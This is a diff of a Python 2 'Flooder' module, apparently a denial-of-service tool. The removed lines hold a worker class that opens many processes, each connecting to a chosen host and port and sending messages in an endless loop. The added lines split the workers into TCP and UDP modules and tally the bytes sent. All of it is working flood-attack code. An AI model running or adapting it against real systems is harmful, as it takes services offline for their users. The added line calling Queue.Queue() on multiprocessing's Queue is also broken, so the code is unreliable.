@@ -1,65 +1,8 @@
-import socket, threading, random, time, os
-from multiprocessing import Process
+from multiprocessing import Queue
 from Events import *
 from main import *
-
-def randomString(length):
-    allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
-    string = ''.join(random.choice(allowedChars) for i in xrange(length))
-    return string
-
-class TCPWorkerThread(Process):
-
-    def __init__(self, flooder, id):
-        Process.__init__(self)
-        self.id = id
-        self.socket = socket.socket()
-        self.socket.setblocking(1)
-
-        self.flooder = flooder
-        self.running = True
-        self.floodCount = 0
-
-        if flooder.random:
-            self.message = randomString(256)
-        else:
-            self.message = self.flooder.message
-
-    def stop(self):
-        self.running = False
-
-    def run(self):
-        while self.running:
-            while self.running:
-                try:
-                    self.socket.connect((self.flooder.host, self.flooder.port))
-                    print "thread", self.id, "connected"
-                    break
-                except Exception as e:
-                    if e.args[0] == 106 or e.args[0] == 60:
-                        break
-                    print "Couldn't connect:", e.args, self.flooder.host, self.flooder.port
-                    time.sleep(1)
-                    continue
-                break
-
-
-            while self.running:
-                try:
-                    #self.flooder.increaseFlood()
-                    bytes = self.socket.send(self.message)
-                    print "thread", self.id, "has sent", bytes, "bytes"
-                    if self.flooder.wait != None and self.flooder.wait != False:
-                        print "thread", self.id, "sleeping for", self.flooder.wait
-                        time.sleep(self.flooder.wait)
-                except Exception as e:
-                    if e.args[0] == 32 or e.args[0] == 104:
-                        print "thread", self.id ,"connection broken, retrying."
-                        self.socket = socket.socket()
-                        break
-                    print "Couldn't send message on thread", self.id, "because", e.args
-                    time.sleep(0.1)
-                    pass
+from UDPWorkerThread import *
+from TCPWorkerThread import *
 
 class Flooder:
 
@@ -76,14 +19,13 @@ class Flooder:
         self.message = message
         self.random = random
         self.threadId = 0
-        self.__floodCount = 0
-        self.__floodLock = threading.Lock()
+        self.byteCount = Queue.Queue()
 
-        if method == TCP_METHOD:
+        if method == TCP_METHOD or method == UDP_METHOD:
             if message == None and random == False:
                 print "Message missing, not starting."
                 return
-        if method == UDP_METHOD or method == HTTP_METHOD:
+        if method == HTTP_METHOD:
             print "Not yet implemented, not starting."
             return
 
@@ -92,7 +34,11 @@ class Flooder:
             return
 
         for x in range(self.threadsAmount):
-            p = TCPWorkerThread(self, self.threadId)
+            p = None
+            if method == TCP_METHOD:
+	            p = TCPWorkerThread(self, self.threadId)
+            elif method == UDP_METHOD:
+	            p = UDPWorkerThread(self, self.threadId)
             self.threadId += 1
             self.__processes.append(p)
             p.start()
@@ -100,14 +46,19 @@ class Flooder:
     def stop(self):
         while len(self.__processes) > 0:
             p = self.__processes.pop()
+            p.stop()
             p.terminate() #This will leave some defunct threads, but they will be reaped upon starting automatically.
 
-        print "final floodcount:", self.__floodCount
+        byteCount = 0
+        #print "len:", self.byteCount.qsize()
+        while 1:
+            try:
+                b = self.byteCount.get(True, 2)
+                byteCount += b
+                #print "b:", b
+            except:
+                #print "failed to get"
+                break
 
-    def floodCount(self):
-        return self.__floodCount
+        print "final byteCount:", byteCount
 
-    def increaseFlood(self):
-        self.__floodLock.acquire()
-        self.__floodCount += 1
-        self.__floodLock.release()
